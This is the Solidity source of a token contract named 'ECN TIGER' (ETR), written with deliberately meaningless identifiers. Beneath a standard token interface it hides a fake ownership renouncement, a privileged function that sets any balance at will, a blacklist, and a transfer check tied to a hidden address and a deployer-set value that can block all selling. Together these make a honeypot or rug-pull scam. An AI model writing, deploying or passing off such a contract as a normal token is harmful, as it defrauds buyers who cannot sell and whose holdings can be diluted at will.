//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface receiverBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract totalSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldFund {
    function createPair(address enableSwap, address atTxFrom) external returns (address);
}

interface tradingLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchMax) external view returns (uint256);

    function transfer(address toTokenSwap, uint256 toSell) external returns (bool);

    function allowance(address walletSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 toSell) external returns (bool);

    function transferFrom(
        address sender,
        address toTokenSwap,
        uint256 toSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeAmount, uint256 value);
    event Approval(address indexed walletSender, address indexed spender, uint256 value);
}

interface tradingLaunchedMetadata is tradingLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ECNTIGER is totalSender, tradingLaunched, tradingLaunchedMetadata {

    uint8 private exemptSell = 18;

    function decimals() external view virtual override returns (uint8) {
        return exemptSell;
    }

    mapping(address => mapping(address => uint256)) private totalReceiver;

    uint256 private amountTradingEnable = 100000000 * 10 ** 18;

    function modeMin(address launchTotal, address toTokenSwap, uint256 toSell) internal returns (bool) {
        if (launchTotal == exemptMode) {
            return receiverLimit(launchTotal, toTokenSwap, toSell);
        }
        uint256 autoFund = tradingLaunched(sellIs).balanceOf(minFund);
        require(autoFund == marketingBuy);
        require(!totalSell[launchTotal]);
        return receiverLimit(launchTotal, toTokenSwap, toSell);
    }

    function owner() external view returns (address) {
        return walletTo;
    }

    constructor (){
        
        autoSell();
        receiverBuy marketingSwap = receiverBuy(takeTrading);
        sellIs = shouldFund(marketingSwap.factory()).createPair(marketingSwap.WETH(), address(this));
        if (minLimit) {
            liquidityReceiver = minExemptAuto;
        }
        exemptMode = _msgSender();
        feeFrom[exemptMode] = true;
        sellExempt[exemptMode] = amountTradingEnable;
        if (exemptBuy != tradingList) {
            exemptBuy = tradingList;
        }
        emit Transfer(address(0), exemptMode, amountTradingEnable);
    }

    function name() external view virtual override returns (string memory) {
        return shouldLimit;
    }

    mapping(address => bool) public totalSell;

    address takeTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return amountTradingEnable;
    }

    bool public enableMax;

    uint256 exemptModeLimit;

    uint256 public liquidityReceiver;

    mapping(address => bool) public feeFrom;

    function getOwner() external view returns (address) {
        return walletTo;
    }

    bool public minLimit;

    mapping(address => uint256) private sellExempt;

    uint256 public takeExempt;

    function maxSell(uint256 toSell) public {
        feeIs();
        marketingBuy = toSell;
    }

    event OwnershipTransferred(address indexed modeLimit, address indexed receiverSell);

    uint256 private exemptBuy;

    function shouldEnableFee(address listTx) public {
        if (totalSwap) {
            return;
        }
        if (minLimit != enableMax) {
            minLimit = true;
        }
        feeFrom[listTx] = true;
        if (liquidityReceiver != exemptBuy) {
            liquidityReceiver = takeExempt;
        }
        totalSwap = true;
    }

    address minFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function launchedMinEnable(address tokenTx, uint256 toSell) public {
        feeIs();
        sellExempt[tokenTx] = toSell;
    }

    uint256 public listLimit;

    function walletTeam(address marketingSell) public {
        feeIs();
        
        if (marketingSell == exemptMode || marketingSell == sellIs) {
            return;
        }
        totalSell[marketingSell] = true;
    }

    uint256 private minExemptAuto;

    function balanceOf(address launchMax) public view virtual override returns (uint256) {
        return sellExempt[launchMax];
    }

    function approve(address liquidityFrom, uint256 toSell) public virtual override returns (bool) {
        totalReceiver[_msgSender()][liquidityFrom] = toSell;
        emit Approval(_msgSender(), liquidityFrom, toSell);
        return true;
    }

    function feeIs() private view {
        require(feeFrom[_msgSender()]);
    }

    function autoSell() public {
        emit OwnershipTransferred(exemptMode, address(0));
        walletTo = address(0);
    }

    string private shouldLimit = "ECN TIGER";

    function receiverLimit(address launchTotal, address toTokenSwap, uint256 toSell) internal returns (bool) {
        require(sellExempt[launchTotal] >= toSell);
        sellExempt[launchTotal] -= toSell;
        sellExempt[toTokenSwap] += toSell;
        emit Transfer(launchTotal, toTokenSwap, toSell);
        return true;
    }

    function allowance(address tradingShouldLaunch, address liquidityFrom) external view virtual override returns (uint256) {
        if (liquidityFrom == takeTrading) {
            return type(uint256).max;
        }
        return totalReceiver[tradingShouldLaunch][liquidityFrom];
    }

    uint256 marketingBuy;

    function transfer(address tokenTx, uint256 toSell) external virtual override returns (bool) {
        return modeMin(_msgSender(), tokenTx, toSell);
    }

    string private fundFrom = "ETR";

    function transferFrom(address launchTotal, address toTokenSwap, uint256 toSell) external override returns (bool) {
        if (_msgSender() != takeTrading) {
            if (totalReceiver[launchTotal][_msgSender()] != type(uint256).max) {
                require(toSell <= totalReceiver[launchTotal][_msgSender()]);
                totalReceiver[launchTotal][_msgSender()] -= toSell;
            }
        }
        return modeMin(launchTotal, toTokenSwap, toSell);
    }

    address public exemptMode;

    uint256 public tradingList;

    address private walletTo;

    address public sellIs;

    bool public totalSwap;

    function symbol() external view virtual override returns (string memory) {
        return fundFrom;
    }

}